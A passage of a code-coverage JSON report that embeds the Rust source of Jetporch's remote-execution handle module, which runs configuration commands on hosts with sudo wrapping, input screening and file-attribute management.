,"stats":{"Line":0}},{"line":88,"address":[],"length":0,"stats":{"Line":0}},{"line":91,"address":[],"length":0,"stats":{"Line":0}},{"line":92,"address":[],"length":0,"stats":{"Line":0}},{"line":93,"address":[],"length":0,"stats":{"Line":0}},{"line":94,"address":[],"length":0,"stats":{"Line":0}},{"line":98,"address":[],"length":0,"stats":{"Line":0}},{"line":99,"address":[],"length":0,"stats":{"Line":0}},{"line":100,"address":[],"length":0,"stats":{"Line":0}},{"line":101,"address":[],"length":0,"stats":{"Line":0}},{"line":102,"address":[],"length":0,"stats":{"Line":0}},{"line":103,"address":[],"length":0,"stats":{"Line":0}},{"line":104,"address":[],"length":0,"stats":{"Line":0}},{"line":105,"address":[],"length":0,"stats":{"Line":0}},{"line":108,"address":[],"length":0,"stats":{"Line":0}},{"line":109,"address":[],"length":0,"stats":{"Line":0}},{"line":113,"address":[],"length":0,"stats":{"Line":0}},{"line":116,"address":[],"length":0,"stats":{"Line":0}},{"line":121,"address":[],"length":0,"stats":{"Line":0}},{"line":122,"address":[],"length":0,"stats":{"Line":0}},{"line":123,"address":[],"length":0,"stats":{"Line":0}},{"line":124,"address":[],"length":0,"stats":{"Line":0}},{"line":125,"address":[],"length":0,"stats":{"Line":0}},{"line":126,"address":[],"length":0,"stats":{"Line":0}},{"line":127,"address":[],"length":0,"stats":{"Line":0}},{"line":128,"address":[],"length":0,"stats":{"Line":0}},{"line":129,"address":[],"length":0,"stats":{"Line":0}},{"line":130,"address":[],"length":0,"stats":{"Line":0}},{"line":135,"address":[],"length":0,"stats":{"Line":0}},{"line":136,"address":[],"length":0,"stats":{"Line":0}},{"line":137,"address":[],"length":0,"stats":{"Line":0}},{"line":138,"address":[],"length":0,"stats":{"Line":0}},{"line":140,"address":[],"length":0,"stats":{"Line":0}}],"covered":0,"coverable":57},{"path":["/","Users","wings","projects","jetpack","src","handle","mod.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\npub mod handle;\npub mod local;\npub mod remote;\npub mod response;\npub mod template;","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","src","handle","remote.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse std::sync::{Arc,Mutex,RwLock};\nuse std::path::Path;\nuse crate::connection::connection::Connection;\nuse crate::connection::command::cmd_info;\nuse crate::tasks::request::{TaskRequest, TaskRequestType};\nuse crate::tasks::response::TaskResponse;\nuse crate::inventory::hosts::{Host,HostOSType};\nuse crate::playbooks::traversal::RunState;\nuse crate::tasks::fields::Field;\nuse crate::tasks::FileAttributesEvaluated;\nuse crate::connection::command::Forward;\nuse crate::tasks::cmd_library::screen_general_input_loose;\nuse crate::handle::handle::CheckRc;\nuse crate::handle::template::Safety;\nuse crate::handle::response::Response;\nuse crate::handle::template::Template;\nuse crate::tasks::files::Recurse;\nuse std::path::PathBuf;\n\n// contains all code that eventually reaches out and touches systems to be configured.\n// this includes the local system (somewhat confusingly) in 'local' mode, and of course\n// SSH-based remotes. 'Remote' should be thought of as 'for the system being configured'\n// as opposed to from the perspective of the control machine.\n\npub struct Remote {\n    run_state: Arc\u003cRunState\u003e, \n    connection: Arc\u003cMutex\u003cdyn Connection\u003e\u003e,\n    host: Arc\u003cRwLock\u003cHost\u003e\u003e, \n    template: Arc\u003cTemplate\u003e,\n    response: Arc\u003cResponse\u003e\n}\n\n#[derive(Debug,Copy,Clone,PartialEq)]\npub enum UseSudo {\n    Yes,\n    No\n}\n\nimpl Remote {\n\n    pub fn new(\n        run_state: Arc\u003cRunState\u003e, \n        connection: Arc\u003cMutex\u003cdyn Connection\u003e\u003e, \n        host: Arc\u003cRwLock\u003cHost\u003e\u003e, \n        template: Arc\u003cTemplate\u003e,\n        response: Arc\u003cResponse\u003e) -\u003e Self {\n        \n        Self {\n            run_state,\n            connection,\n            host,\n            template,\n            response,\n        }\n    }\n\n    pub fn unwrap_string_result(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, str_result: \u0026Result\u003cString,String\u003e) -\u003e Result\u003cString, Arc\u003cTaskResponse\u003e\u003e {\n        return match str_result {\n            Ok(x) =\u003e Ok(x.clone()),\n            Err(y) =\u003e {\n                return Err(self.response.is_failed(request, \u0026y.clone()));\n            }\n        };\n    }\n\n    // who is the remote user?\n    pub fn get_whoami(\u0026self) -\u003e Result\u003cString,String\u003e {\n        return self.connection.lock().unwrap().whoami();\n    }\n\n    // various files need to store things in tmp locations, mainly because SFTP does not support sudo or give the root\n    // user the ability to replace unowned files\n\n    pub fn make_temp_path(\u0026self, who: \u0026String, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003c(PathBuf, PathBuf), Arc\u003cTaskResponse\u003e\u003e {\n        let mut pb = PathBuf::new();\n        let tmpdir = match who.eq(\"root\") {\n            false =\u003e match self.host.read().unwrap().os_type {\n                Some(HostOSType::MacOS) =\u003e format!(\"/Users/{}/.jet/tmp\", who),\n                _ =\u003e format!(\"/home/{}/.jet/tmp\", who),\n            }\n            true =\u003e String::from(\"/root/.jet/tmp\")\n        };\n        pb.push(tmpdir);\n        let mut pb2 = pb.clone();\n        let guid = self.run_state.context.read().unwrap().get_guid();\n        pb2.push(guid.as_str());\n        let create_tmp_dir = format!(\"mkdir -p '{}'\", pb.display());\n        self.run_no_sudo(request, \u0026create_tmp_dir, CheckRc::Checked)?;\n        return Ok((pb.clone(), pb2.clone()));\n    }\n\n    // wrappers around running CLI commands\n\n    pub fn run(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, cmd: \u0026String, check_rc: CheckRc) -\u003e Result\u003cArc\u003cTaskResponse\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        return self.internal_run(request, cmd, Safety::Safe, check_rc, UseSudo::Yes, Forward::No);\n    }\n\n    pub fn run_forwardable(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, cmd: \u0026String, check_rc: CheckRc) -\u003e Result\u003cArc\u003cTaskResponse\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        return self.internal_run(request, cmd, Safety::Safe, check_rc, UseSudo::Yes, Forward::Yes);\n    }\n\n    pub fn run_no_sudo(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, cmd: \u0026String, check_rc: CheckRc) -\u003e Result\u003cArc\u003cTaskResponse\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        return self.internal_run(request, cmd, Safety::Safe, check_rc, UseSudo::No, Forward::No);\n    }\n\n    // the unsafe version of this doesn't check the shell string for possible shell variable injections, the most obvious and basic being \";\"\n    // usage of unsafe requires a special keyword in the 'shell' module for instance, or that no variables are present in the cmd parameter.\n\n    pub fn run_unsafe(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, cmd: \u0026String, check_rc: CheckRc) -\u003e Result\u003cArc\u003cTaskResponse\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        return self.internal_run(request, cmd, Safety::Unsafe, check_rc, UseSudo::Yes, Forward::No);\n    }\n\n    fn internal_run(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, cmd: \u0026String, \n        safe: Safety, check_rc: CheckRc, use_sudo: UseSudo, forward: Forward) -\u003e Result\u003cArc\u003cTaskResponse\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        \n        assert!(request.request_type != TaskRequestType::Validate, \"commands cannot be run in validate stage\");\n\n        // apply basic screening of the entire shell command, more filtering should already be done by cmd_library\n        // for parameterized calls that use that\n               \n        if safe == Safety::Safe {\n            // check for invalid shell parameters\n            match screen_general_input_loose(\u0026cmd) {\n                Ok(_x) =\u003e {},\n                Err(y) =\u003e return Err(self.response.is_failed(request, \u0026y.clone()))\n            }\n        }\n\n        // use the sudo template to choose a new command to execute if specified.\n        // this doesn't need to be sudo specifically, it's really a generic concept that can wrap a command with another tool\n\n        let cmd_out = match use_sudo {\n            UseSudo::Yes =\u003e match self.template.add_sudo_details(request, \u0026cmd) {\n                Ok(x) =\u003e x,\n                Err(y) =\u003e { return Err(self.response.is_failed(request, \u0026format!(\"failure constructing sudo command: {}\", y))); }\n            },\n            UseSudo::No =\u003e cmd.clone() \n        };\n\n        self.response.get_visitor().read().expect(\"read visitor\").on_command_run(\u0026self.response.get_context(), \u0026Arc::clone(\u0026self.host), \u0026cmd);\n\n        let result = self.connection.lock().unwrap().run_command(\u0026self.response, request, \u0026cmd_out, forward);\n\n        // if requested, turn non-zero return codes into errors\n\n        if check_rc == CheckRc::Checked \u0026\u0026 result.is_ok() {\n            let ok_result = result.as_ref().unwrap();\n            let cmd_result = ok_result.command_result.as_ref().as_ref().unwrap();\n            if cmd_result.rc != 0 {\n                return Err(self.response.command_failed(request, \u0026Arc::new(Some(cmd_result.clone()))));\n            }\n        }\n\n        return result;\n    }\n\n    // the OS type of a host is set on connection by automatically running a discovery command\n\n    pub fn get_os_type(\u0026self) -\u003e HostOSType {\n        let os_type = self.host.read().unwrap().os_type;\n        if os_type.is_none() {\n            panic!(\"failed to detect OS type for {}, bailing out\", self.host.read().unwrap().name);\n        }\n        return os_type.unwrap();\n    }\n\n    // when we need to write a file we need to place it in a particular temp location and then move it\n\n    pub fn get_transfer_location(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003c(Option\u003cPathBuf\u003e, Option\u003cPathBuf\u003e), Arc\u003cTaskResponse\u003e\u003e {\n        let whoami = match self.get_whoami() {\n            Ok(x) =\u003e x,\n            Err(y) =\u003e { return Err(self.response.is_failed(request, \u0026format!(\"cannot determine current user: {}\", y))) }\n        };\n        let (p1,f1) = self.make_temp_path(\u0026whoami, request)?;\n        return Ok((Some(p1.clone()), Some(f1.clone())))\n    }\n\n    // supporting code for file transfer using temp files\n\n    fn get_effective_filename(\u0026self, temp_dir: Option\u003cPathBuf\u003e, temp_path: Option\u003cPathBuf\u003e, path: \u0026String) -\u003e String {\n        let result = match temp_dir.is_some() {\n            true =\u003e {\n                let t = temp_path.as_ref().unwrap();\n                t.clone().into_os_string().into_string().unwrap()\n            },\n            false =\u003e  path.clone()\n        };\n        return result;\n    }\n\n    // more supporting code for file transfer using temp files\n\n    fn conditionally_move_back(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, temp_dir: Option\u003cPathBuf\u003e, temp_path: Option\u003cPathBuf\u003e, desired_path: \u0026String) -\u003e Result\u003c(), Arc\u003cTaskResponse\u003e\u003e {\n        if temp_dir.is_some() {\n            let move_to_correct_location = format!(\"mv '{}' '{}'\", temp_path.as_ref().unwrap().display(), desired_path);\n            let delete_tmp_location = format!(\"rm '{}'\", temp_path.as_ref().unwrap().display());\n            let result = self.run(request, \u0026move_to_correct_location, CheckRc::Checked);\n            if result.is_err() {\n                let _ = self.run(request, \u0026delete_tmp_location, CheckRc::Unchecked);\n                return Err(result.unwrap_err());\n            }\n        }\n        Ok(())\n    }\n\n    // writes a string (for example, from a template) to a remote file location\n\n    pub fn write_data\u003cG\u003e(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, data: \u0026String, path: \u0026String, mut before_complete: G) -\u003e Result\u003c(), Arc\u003cTaskResponse\u003e\u003e \n        where G: FnMut(\u0026String) -\u003e Result\u003c(), Arc\u003cTaskResponse\u003e\u003e {   \n        let (temp_dir, temp_path) = self.get_transfer_location(request)?;\n        let real_path = self.get_effective_filename(temp_dir.clone(), temp_path.clone(), path); /* will be either temp_path or path */\n        self.response.get_visitor().read().expect(\"read visitor\").on_before_transfer(\u0026self.response.get_context(), \u0026Arc::clone(\u0026self.host), \u0026real_path);\n        let xfer_result = self.connection.lock().unwrap().write_data(\u0026self.response, request, data, \u0026real_path)?;\n        before_complete(\u0026real_path.clone())?;\n        self.conditionally_move_back(request, temp_dir.clone(), temp_path.clone(), path)?;\n        return Ok(xfer_result);\n    }\n\n    // copies a file to a remote location\n\n    pub fn copy_file\u003cG\u003e(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, src: \u0026Path, dest: \u0026String, mut before_complete: G) -\u003e Result\u003c(), Arc\u003cTaskResponse\u003e\u003e \n    where G: FnMut(\u0026String) -\u003e Result\u003c(), Arc\u003cTaskResponse\u003e\u003e {   \n        let (temp_dir, temp_path) = self.get_transfer_location(request)?;\n        let real_path = self.get_effective_filename(temp_dir.clone(), temp_path.clone(), dest); /* will be either temp_path or path */\n        self.response.get_visitor().read().expect(\"read visitor\").on_before_transfer(\u0026self.response.get_context(), \u0026Arc::clone(\u0026self.host), \u0026real_path);\n        let xfer_result = self.connection.lock().unwrap().copy_file(\u0026self.response, \u0026request, src, \u0026real_path)?;        \n        before_complete(\u0026real_path.clone())?;\n        self.conditionally_move_back(request, temp_dir.clone(), temp_path.clone(), dest)?;\n        return Ok(xfer_result);\n    }\n\n    // gets the octal string mode of a remote file\n\n    pub fn get_mode(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, path: \u0026String) -\u003e Result\u003cOption\u003cString\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        let get_cmd_result = crate::tasks::cmd_library::get_mode_command(self.get_os_type(), path);\n        let cmd = self.unwrap_string_result(\u0026request, \u0026get_cmd_result)?;\n        \n        let result = self.run(request, \u0026cmd, CheckRc::Unchecked)?;\n        let (rc, out) = cmd_info(\u0026result);\n        return match rc {\n            // we can all unwrap because all possible string lists will have at least 1 element\n            0 =\u003e Ok(Some(out.split_whitespace().nth(0).unwrap().to_string())),\n            _ =\u003e Ok(None),\n        }\n    }\n\n    // is a remote path a file?\n\n    pub fn get_is_file(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, path: \u0026String) -\u003e Result\u003cbool,Arc\u003cTaskResponse\u003e\u003e {\n        return match self.get_is_directory(request, path) {\n            Ok(true) =\u003e Ok(false),\n            Ok(false) =\u003e Ok(true),\n            Err(x) =\u003e Err(x)\n        };\n    }\n\n    // is a remote path a directory?\n\n    pub fn get_is_directory(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, path: \u0026String) -\u003e Result\u003cbool,Arc\u003cTaskResponse\u003e\u003e {\n        let get_cmd_result = crate::tasks::cmd_library::get_is_directory_command(self.get_os_type(), path);\n        let cmd = self.unwrap_string_result(\u0026request, \u0026get_cmd_result)?;\n        \n        let result = self.run(request, \u0026cmd, CheckRc::Checked)?;\n        let (_rc, out) = cmd_info(\u0026result);\n        // so far this assumes reliable ls -ld output across all supported operating systems, this may change\n        // in wich case we may need to consider os_type here\n        if out.starts_with(\"d\") {\n            return Ok(true);\n        }\n        return Ok(false);\n    }\n\n    pub fn touch_file(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, path: \u0026String) -\u003e Result\u003cArc\u003cTaskResponse\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        let get_cmd_result = crate::tasks::cmd_library::get_touch_command(self.get_os_type(), path);\n        let cmd = self.unwrap_string_result(\u0026request, \u0026get_cmd_result)?;\n        return self.run(request, \u0026cmd, CheckRc::Checked);  \n    }\n\n    pub fn create_directory(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, path: \u0026String) -\u003e Result\u003cArc\u003cTaskResponse\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        let get_cmd_result = crate::tasks::cmd_library::get_create_directory_command(self.get_os_type(), path);\n        let cmd = self.unwrap_string_result(\u0026request, \u0026get_cmd_result)?;\n        return self.run(request, \u0026cmd, CheckRc::Checked);  \n    }\n\n    pub fn delete_file(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, path: \u0026String) -\u003e Result\u003cArc\u003cTaskResponse\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        let get_cmd_result = crate::tasks::cmd_library::get_delete_file_command(self.get_os_type(), path);\n        let cmd = self.unwrap_string_result(\u0026request, \u0026get_cmd_result)?;\n        return self.run(request, \u0026cmd, CheckRc::Checked);  \n    }\n\n    pub fn delete_directory(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, path: \u0026String, recurse: Recurse) -\u003e Result\u003cArc\u003cTaskResponse\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        let get_cmd_result = crate::tasks::cmd_library::get_delete_directory_command(self.get_os_type(), path, recurse);\n        let cmd = self.unwrap_string_result(\u0026request, \u0026get_cmd_result)?;\n        if path.eq(\"/\") {\n            return Err(self.response.is_failed(request, \u0026String::from(\"accidental removal of / blocked by safeguard\")));\n        }\n        return self.run(request, \u0026cmd, CheckRc::Checked);  \n    }\n\n    // return the (owner,group) tuple for a remote file.  If the command fails this will instead return None\n    // so consider running get_mode first.  See the various file modules for examples.\n\n    pub fn get_ownership(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, path: \u0026String) -\u003e Result\u003cOption\u003c(String,String)\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        let get_cmd_result = crate::tasks::cmd_library::get_ownership_command(self.get_os_type(), path);\n        let cmd = self.unwrap_string_result(\u0026request, \u0026get_cmd_result)?;\n        \n        let result = self.run(request, \u0026cmd, CheckRc::Unchecked)?;\n        let (rc, out) = cmd_info(\u0026result);\n\n        match rc {\n            0 =\u003e {},\n            _ =\u003e { return Ok(None); },\n        }\n\n        let mut split = out.split_whitespace();\n        let owner = match split.nth(2) {\n            Some(x) =\u003e x,\n            None =\u003e { \n                return Err(self.response.is_failed(request, \u0026format!(\"unexpected output format from {}: {}\", cmd, out)));\n            }\n        };\n        // this is a progressive iterator, hence 0 and not 3 for nth() below!\n        let group = match split.nth(0) {\n            Some(x) =\u003e x,\n            None =\u003e { \n                return Err(self.response.is_failed(request, \u0026format!(\"unexpected output format from {}: {}\", cmd, out))); \n            }\n        };\n        return Ok(Some((owner.to_string(),group.to_string())));\n    }\n\n    pub fn set_owner(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, remote_path: \u0026String, owner: \u0026String, recurse: Recurse) -\u003e Result\u003cArc\u003cTaskResponse\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        let get_cmd_result = crate::tasks::cmd_library::set_owner_command(self.get_os_type(), remote_path, owner, recurse);\n        let cmd = self.unwrap_string_result(\u0026request, \u0026get_cmd_result)?;\n        return self.run(request,\u0026cmd,CheckRc::Checked);\n    }\n\n    pub fn set_group(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, remote_path: \u0026String, group: \u0026String, recurse: Recurse) -\u003e Result\u003cArc\u003cTaskResponse\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        let get_cmd_result = crate::tasks::cmd_library::set_group_command(self.get_os_type(), remote_path, group, recurse);\n        let cmd = self.unwrap_string_result(\u0026request, \u0026get_cmd_result)?;\n        return self.run(request,\u0026cmd,CheckRc::Checked);\n    }\n\n    pub fn set_mode(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, remote_path: \u0026String, mode: \u0026String, recurse: Recurse) -\u003e Result\u003cArc\u003cTaskResponse\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        let get_cmd_result = crate::tasks::cmd_library::set_mode_command(self.get_os_type(), remote_path, mode, recurse);\n        let cmd = self.unwrap_string_result(\u0026request, \u0026get_cmd_result)?;\n        return self.run(request,\u0026cmd,CheckRc::Checked);\n    }\n\n    pub fn get_sha512(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, path: \u0026String) -\u003e Result\u003cString,Arc\u003cTaskResponse\u003e\u003e {\n        return self.internal_sha512(request, path);\n    }\n\n    // right now we assume there's a good way to run SHA-512 preinstalled on all platforms.\n\n    fn internal_sha512(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, path: \u0026String) -\u003e Result\u003cString,Arc\u003cTaskResponse\u003e\u003e {\n        \n        let os_type = self.get_os_type();\n        let get_cmd_result = crate::tasks::cmd_library::get_sha512_command(os_type, path);\n        let cmd = self.unwrap_string_result(\u0026request, \u0026get_cmd_result)?;\n\n        let result = self.run(request, \u0026cmd, CheckRc::Unchecked)?;\n\n        let (rc, out) = cmd_info(\u0026result);\n        match rc {\n            // we can all unwrap because all possible string lists will have at least 1 element\n            0 =\u003e {\n                let value = out.split_whitespace().nth(0).unwrap().to_string();\n                return Ok(value);\n            },\n            127 =\u003e {\n                // file not found\n                return Ok(String::from(\"\"))\n            },\n            _ =\u003e {\n                return Err(self.response.is_failed(request, \u0026format!(\"checksum failed: {}. {}\", path, out)));\n            }\n        };\n    }\n\n    // supporting code for any tasks that has an 'attributes' member, see 'template' for one example of usage\n    // TODO: add SELinux\n\n    pub fn query_common_file_attributes(\u0026self, request: \u0026Arc\u003cTaskRequest\u003e, remote_path: \u0026String, \n        attributes_in: \u0026Option\u003cFileAttributesEvaluated\u003e, changes: \u0026mut Vec\u003cField\u003e, recurse: Recurse) -\u003e Result\u003cOption\u003cString\u003e,Arc\u003cTaskResponse\u003e\u003e {\n\n        let remote_mode = self.get_mode(request, remote_path)?;\n        \n        if remote_mode.is_none() {\n            changes.push(Field::Content);\n            return Ok(None);\n        }\n\n        if attributes_in.is_some() \u0026\u0026 recurse == Recurse::Yes {\n            changes.push(Field::Owner);\n            changes.push(Field::Group);\n            changes.push(Field::Mode);\n            return Ok(remote_mode);\n        }\n\n        if attributes_in.is_some() {\n            let attributes = attributes_in.as_ref().unwrap();\n            let owner_result = self.get_ownership(request, remote_path)?;\n            if owner_result.is_none() {\n                return Err(self.response.is_failed(request, \u0026String::from(\"file was deleted unexpectedly mid-operation\")));\n            }\n            let (remote_owner, remote_group) = owner_result.unwrap();\n\n            if attributes.owner.is_some() \u0026\u0026 ! remote_owner.eq(attributes.owner.as_ref().unwrap()) { \n                changes.push(Field::Owner); \n            }\n            if attributes.group.is_some() \u0026\u0026 ! remote_group.eq(attributes.group.as_ref().unwrap())  { \n                changes.push(Field::Group); \n            }\n            if attributes.mode.is_some() \u0026\u0026 ! remote_mode.as_ref().unwrap().eq(attributes.mode.as_ref().unwrap()) { \n                changes.push(Field::Mode); \n            }\n        }\n        return Ok(remote_mode);\n    }\n\n    // supporting code for workign with files that have configurable attributes. See above + also\n    // modules like template.\n    // TODO: add SELinux\n\n    pub fn process_common_file_attributes(\u0026self, \n        request: \u0026Arc\u003cTaskRequest\u003e, \n        remote_path: \u0026String, \n        attributes_in: \u0026Option\u003cFileAttributesEvaluated\u003e, \n        changes: \u0026Vec\u003cField\u003e,\n        recurse: Recurse)\n\n            -\u003e Result\u003c(),Arc\u003cTaskResponse\u003e\u003e {\n\n        if attributes_in.is_none() {\n            return Ok(());\n        }\n        let attributes = attributes_in.as_ref().unwrap();\n\n        for change in changes.iter() {\n            match change {\n                Field::Owner =\u003e {\n                    if attributes.owner.is_some() {\n                        self.set_owner(request, remote_path, \u0026attributes.owner.as_ref().unwrap(), recurse)?;\n                    }\n                },\n                Field::Group =\u003e {\n                    if attributes.group.is_some() {\n                        self.set_group(request, remote_path, \u0026attributes.group.as_ref().unwrap(), recurse)?;\n                    }\n                },\n                Field::Mode =\u003e {\n                    if attributes.mode.is_some() {\n                        self.set_mode(request, remote_path, \u0026attributes.mode.as_ref().unwrap(), recurse)?;\n                    }\n                },\n                _ =\u003e {}\n            }\n        }\n        return Ok(());\n    }\n\n    // see above comments about file attributes features.  \n\n    pub fn process_all_common_file_attributes(\u0026self, \n        request: \u0026Arc\u003cTaskRequest\u003e, \n        remote_path: \u0026String, \n        attributes_in: \u0026Option\u003cFileAttributesEvaluated\u003e,\n        recurse: Recurse) \n             -\u003e Result\u003c(),Arc\u003cTaskResponse\u003e\u003e {\n\n        let all = Field::all_file_attributes();\n        return self.process_common_file_attributes(request, remote_path, attributes_in, \u0026all, recurse);\n    }\n\n\n}","traces":[{"line":57,"address":[],"length":0,"stats":{"Line":0}},{"line":73,"address":[],"length":0,"stats":{"Line":0}},{"line":74,"address":[],"length":0,"stats":{"Line":0}},{"line":75,"address":[],"length":0,"stats":{"Line":0}},{"line":76,"address":[],"length":0,"stats":{"Line":0}},{"line":77,"address":[],"length":0,"stats":{"Line":0}},{"line":83,"address":[],"length":0,"stats":{"Line":0}},{"line":84,"address":[],"length":0,"stats":{"Line":0}},{"line":90,"address":[],"length":0,"stats":{"Line":0}},{"line":91,"address":[],"length":0,"stats":{"Line":0}},{"line":92,"address":[],"length":0,"stats":{"Line":0}},{"line":93,"address":[],"length":0,"stats":{"Line":0}},{"line":94,"address":[],"length":0,"stats":{"Line":0}},{"line":95,"address":[],"length":0,"stats":{"Line":0}},{"line":97,"address":[],"length":0,"stats":{"Line":0}},{"line":99,"address":[],"length":0,"stats":{"Line":0}},{"line":100,"address":[],"length":0,"stats":{"Line":0}},{"line":101,"address":[],"length":0,"stats":{"Line":0}},{"line":102,"address":[],"length":0,"stats":{"Line":0}},{"line":103,"address":[],"length":0,"stats":{"Line":0}},{"line":104,"address":[],"length":0,"stats":{"Line":0}},{"line":105,"address":[],"length":0,"stats":{"Line":0}},{"line":110,"address":[],"length":0,"stats":{"Line":0}},{"line":111,"address":[],"length":0,"stats":{"Line":0}},{"line":114,"address":[],"length":0,"stats":{"Line":0}},{"line":115,"address":[],"length":0,"stats":{"Line":0}},{"line":118,"address":[],"length":0,"stats":{"Line":0}},{"line":119,"address":[],"length":0,"stats":{"Line":0}},{"line":125,"address":[],"length":0,"stats":{"Line":0}},{"line":126,"address":[],"length":0,"stats":{"Line":0}},{"line":129,"address":[],"length":0,"stats":{"Line":0}},{"line":132,"address":[],"length":0,"stats":{"Line":0}},{"line":137,"address":[],"length":0,"stats":{"Line":0}},{"line":139,"address":[],"length":0,"stats":{"Line":0}},{"line":140,"address":[],"length":0,"stats":{"Line":0}},{"line":141,"address":[],"length":0,"stats":{"Line":0}},{"line":148,"address":[],"length":0,"stats":{"Line":0}},{"line":149,"address":[],"length":0,"stats":{"Line":0}},{"line":150,"address":[],"length":0,"stats":{"Line":0}},{"line":151,"address":[],"length":0,"stats":{"Line":0}},{"line":153,"address":[],"length":0,"stats":{"Line":0}},{"line":156,"address":[],"length":0,"stats":{"Line":0}},{"line":158,"address":[],"length":0,"stats":{"Line":0}},{"line":162,"address":[],"length":0,"stats":{"Line":0}},{"line":163,"address":[],"length":0,"stats":{"Line":0}},{"line":164,"address":[],"length":0,"stats":{"Line":0}},{"line":165,"address":[],"length":0,"stats":{"Line":0}},{"line":166,"address":[],"length":0,"stats":{"Line":0}},{"line":170,"address":[],"length":0,"stats":{"Line":0}},{"line":175,"address":[],"length":0,"stats":{"Line":0}},{"line":176,"address":[],"length":0,"stats":{"Line":0}},{"line":177,"address":[],"length":0,"stats":{"Line":0}},{"line":178,"address":[],"length":0,"stats":{"Line":0}},{"line":180,"address":[],"length":0,"stats":{"Line":0}},{"line":185,"address":[],"length":0,"stats":{"Line":0}},{"line":186,"address":[],"length":0,"stats":{"Line":0}},{"line":187,"address":[],"length":0,"stats":{"Line":0}},{"line":188,"address":[],"length":0,"stats":{"Line":0}},{"line":190,"address":[],"length":0,"stats":{"Line":0}},{"line":191,"address":[],"length":0,"stats":{"Line":0}},{"line":196,"address":[],"length":0,"stats":{"Line":0}},{"line":197,"address":[],"length":0,"stats":{"Line":0}},{"line":199,"address":[],"length":0,"stats":{"Line":0}},{"line":200,"address":[],"length":0,"stats":{"Line":0}},{"line":202,"address":[],"length":0,"stats":{"Line":0}},{"line":204,"address":[],"length":0,"stats":{"Line":0}},{"line":209,"address":[],"length":0,"stats":{"Line":0}},{"line":210,"address":[],"length":0,"stats":{"Line":0}},{"line":211,"address":[],"length":0,"stats":{"Line":0}},{"line":212,"address":[],"length":0,"stats":{"Line":0}},{"line":213,"address":[],"length":0,"stats":{"Line":0}},{"line":214,"address":[],"length":0,"stats":{"Line":0}},{"line":215,"address":[],"length":0,"stats":{"Line":0}},{"line":216,"address":[],"length":0,"stats":{"Line":0}},{"line":219,"address":[],"length":0,"stats":{"Line":0}},{"line":224,"address":[],"length":0,"stats":{"Line":0}},{"line":226,"address":[],"length":0,"stats":{"Line":0}},{"line":227,"address":[],"length":0,"stats":{"Line":0}},{"line":228,"address":[],"length":0,"stats":{"Line":0}},{"line":229,"address":[],"length":0,"stats":{"Line":0}},{"line":230,"address":[],"length":0,"stats":{"Line":0}},{"line":231,"address":[],"length":0,"stats":{"Line":0}},{"line":232,"address":[],"length":0,"stats":{"Line":0}},{"line":237,"address":[],"length":0,"stats":{"Line":0}},{"line":239,"address":[],"length":0,"stats":{"Line":0}},{"line":240,"address":[],"length":0,"stats":{"Line":0}},{"line":241,"address":[],"length":0,"stats":{"Line":0}},{"line":242,"address":[],"length":0,"stats":{"Line":0}},{"line":243,"address":[],"length":0,"stats":{"Line":0}},{"line":244,"address":[],"length":0,"stats":{"Line":0}},{"line":245,"address":[],"length":0,"stats":{"Line":0}},{"line":250,"address":[],"length":0,"stats":{"Line":0}},{"line":251,"address":[],"length":0,"stats":{"Line":0}},{"line":252,"address":[],"length":0,"stats":{"Line":0}},{"line":254,"address":[],"length":0,